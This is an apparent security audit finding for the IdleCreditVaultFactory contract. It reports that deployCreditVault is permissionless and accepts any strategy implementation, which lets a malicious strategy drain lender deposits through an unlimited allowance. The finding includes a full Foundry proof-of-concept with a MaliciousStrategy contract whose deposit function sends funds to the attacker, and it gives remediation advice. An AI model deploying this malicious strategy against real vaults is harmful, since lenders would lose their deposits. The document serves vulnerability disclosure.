### Title

Unvalidated strategy implementation lets a factory-deployed vault steal lender deposits - (File: `contracts/IdleCreditVaultFactory.sol`)

### Summary

`IdleCreditVaultFactory.deployCreditVault` is permissionless and accepts a caller-supplied `strategyData.implementation` without checking that it is an approved `IdleCreditVault` implementation. The factory deploys a proxy to that arbitrary implementation and then initializes the credit vault with the resulting strategy address [1](#0-0) . During credit-vault initialization, the legitimate CDO grants unlimited underlying-token allowance to that strategy [2](#0-1) . A malicious strategy can therefore drain every deposit when `depositAA` forwards funds through `IIdleCDOStrategy(strategy).deposit(_amount)` [3](#0-2) .

### Finding Description

`CreditVaultParams.implementation`, `StrategyData.implementation`, queue, write-off escrow, and programmable-borrower implementation fields are all supplied by the external caller and passed directly to `_deployProxy` [4](#0-3) . There is no implementation whitelist, bytecode hash check, interface verification, or deployer allowlist before `deployCreditVault` calls `_deployBaseCreditVault` [1](#0-0) .

The strongest exploit uses `strategyData.implementation`. A malicious implementation only needs to:

1. Accept the expected `initialize` call and record the underlying token.
2. Return itself from `strategyToken`.
3. Return benign ERC20 metadata and successful `approve`/`balanceOf` responses.
4. Silently accept the subsequent configuration calls.
5. Implement `deposit(uint256)` as `underlying.transferFrom(msg.sender, attacker, amount)`.

The factory then emits `CreditVaultDeployed`, presenting the malicious strategy and legitimate CDO proxy as a factory-created pair [5](#0-4) .

### Impact Explanation

A lender depositing into the emitted credit-vault address loses the full deposited amount. During `depositAA`, the legitimate CDO first transfers tokens from the lender to itself and then calls the strategy's `deposit` function [6](#0-5) . Because the CDO approved the strategy for unlimited spending during initialization, the malicious strategy can immediately move those tokens to the attacker [7](#0-6) .

For example, a 100,000 USDC deposit results in a 100,000 USDC loss to the lender. The minted tranche tokens are backed by no remaining CDO or strategy assets, violating the fair-mint and deposit-custody invariant.

### Likelihood Explanation

Any unprivileged caller can invoke `deployCreditVault`; the function has no `onlyOwner`, treasury, manager, KYC, or borrower restriction [8](#0-7) . The malicious deployment also emits the canonical `CreditVaultDeployed` event, which is the natural integration signal for frontends, indexers, or users tracking factory deployments [9](#0-8) .

The attack requires a victim to deposit into the malicious proxy. This is a plausible consequence of allowing arbitrary implementations behind the official factory event rather than a flaw affecting previously deployed vaults.

### Recommendation

Do not accept arbitrary implementation addresses from `deployCreditVault` or `deployRevolvingCreditVault` callers.

Preferably:

- Store treasury-approved implementation addresses or implementation bytecode hashes in the factory.
- Revert when a supplied implementation is not registered.
- Alternatively, remove implementation parameters entirely and have the factory use immutable canonical implementations.
- Emit implementation addresses or hashes in `CreditVaultDeployed` so integrations can verify them.
- If ancillary implementations remain configurable, whitelist `queueImplementation`, `writeOffImplementation`, and `programmableBorrowerParams.implementation` as well.

### Proof of Concept

The following Foundry test demonstrates that an attacker can pass a malicious strategy implementation, receive a legitimate CDO proxy and canonical deployment event, and drain a lender's deposit through the CDO's unlimited strategy allowance.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {TransparentUpgradeableProxy} from
    "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import {IdleCreditVaultFactory} from "../contracts/IdleCreditVaultFactory.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";

contract Token is ERC20 {
    constructor() ERC20("USD Coin", "USDC") {}

    function decimals() public pure override returns (uint8) {
        return 6;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MaliciousStrategy {
    address private immutable attacker;
    Token private underlying;

    constructor() {
        attacker = msg.sender;
    }

    function initialize(
        address underlying_,
        address,
        address,
        address,
        string memory,
        uint256
    ) external {
        underlying = Token(underlying_);
    }

    function strategyToken() external view returns (address) {
        return address(this);
    }

    function symbol() external pure returns (string memory) {
        return "MAL";
    }

    function decimals() external pure returns (uint8) {
        return 6;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function deposit(uint256 amount) external {
        // msg.sender is the legitimate credit-vault proxy, which has already
        // approved this strategy for unlimited underlying spending.
        underlying.transferFrom(msg.sender, attacker, amount);
    }

    // Silently accepts setAprs, setWhitelistedCDO, transferOwnership, and
    // any other factory configuration calls.
    fallback() external {}
}

contract FactoryImplementationValidationPoC is Test {
    bytes32 internal constant DEPLOYED =
        keccak256("CreditVaultDeployed(address,address,address,address,address,address)");

    address treasury = makeAddr("treasury");
    address proxyAdmin = makeAddr("proxyAdmin");
    address factoryAdmin = makeAddr("factoryAdmin");
    address attacker = makeAddr("attacker");
    address manager = makeAddr("manager");
    address feeReceiver = makeAddr("feeReceiver");
    address lender = makeAddr("lender");

    function testMaliciousStrategyDrainsFactoryVaultDeposit() external {
        Token underlying = new Token();

        IdleCreditVaultFactory factoryImpl = new IdleCreditVaultFactory();
        IdleCreditVaultFactory factory = IdleCreditVaultFactory(
            address(new TransparentUpgradeableProxy(
                address(factoryImpl),
                factoryAdmin,
                abi.encodeCall(
                    IdleCreditVaultFactory.initialize,
                    (treasury, proxyAdmin)
                )
            ))
        );

        vm.startPrank(attacker);
        MaliciousStrategy maliciousStrategy = new MaliciousStrategy();
        IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();

        IdleCreditVaultFactory.CreditVaultParams memory cvParams =
            IdleCreditVaultFactory.CreditVaultParams({
                implementation: address(cdoImpl),
                limit: 0,
                underlying: address(underlying),
                apr: 12e18,
                epochDuration: 7 days,
                bufferPeriod: 1 days,
                instantWithdrawDelay: 1 hours,
                instantWithdrawAprDelta: 1e18,
                disableInstantWithdraw: true,
                keyringPolicy: 0,
                feeReceiver: feeReceiver,
                fees: 5_000,
                managementFee: 500,
                isInterestMinted: false,
                isDepositDuringEpochDisabled: false
            });

        IdleCreditVaultFactory.StrategyData memory strategyData =
            IdleCreditVaultFactory.StrategyData({
                implementation: address(maliciousStrategy),
                manager: manager,
                borrower: makeAddr("borrower"),
                borrowerName: "Borrower"
            });

        IdleCreditVaultFactory.AncillaryParams memory ancillaryParams =
            IdleCreditVaultFactory.AncillaryParams({
                keyring: address(0),
                queueImplementation: address(0),
                prefundedDepositWindow: 0,
                writeOffImplementation: address(0)
            });

        vm.recordLogs();
        factory.deployCreditVault(cvParams, strategyData, ancillaryParams);
        Vm.Log[] memory logs = vm.getRecordedLogs();

        address creditVault;
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].topics[0] == DEPLOYED) {
                (creditVault,,,,,) = abi.decode(
                    logs[i].data,
                    (address, address, address, address, address, address)
                );
            }
        }
        vm.stopPrank();

        assertTrue(creditVault != address(0));

        uint256 depositAmount = 100_000e6;
        underlying.mint(lender, depositAmount);

        vm.startPrank(lender);
        underlying.approve(creditVault, depositAmount);
        IdleCDOEpochVariant(creditVault).depositAA(depositAmount);
        vm.stopPrank();

        assertEq(underlying.balanceOf(attacker), depositAmount);
        assertEq(underlying.balanceOf(creditVault), 0);
    }
}
```

  function _deposit(uint256 _amount, address _tranche) internal virtual whenNotPaused returns (uint256 _minted) {
    if (_amount == 0) {
      return _minted;
    }
    // check that we are not depositing more than the contract available limit
    _guarded(_amount);
    // interest accrued since last depositXX/withdrawXX is splitted between AA and BB
    // according to trancheAPRSplitRatio. NAVs of AA and BB are updated and tranche
    // prices adjusted accordingly
    _updateAccounting();
    // get underlyings from sender
    address _token = token;
    uint256 _preBal = _contractTokenBalance(_token);
    _transferUnderlyingsFrom(msg.sender, address(this), _amount);
    // mint tranche tokens according to the current tranche price
    _minted = _mintSharesAtCurrPrice(_contractTokenBalance(_token) - _preBal, msg.sender, _tranche);
    // update trancheAPRSplitRatio
    _updateSplitRatio(_getAARatio(true));

    // direct deposit in the strategy
    IIdleCDOStrategy(strategy).deposit(_amount);
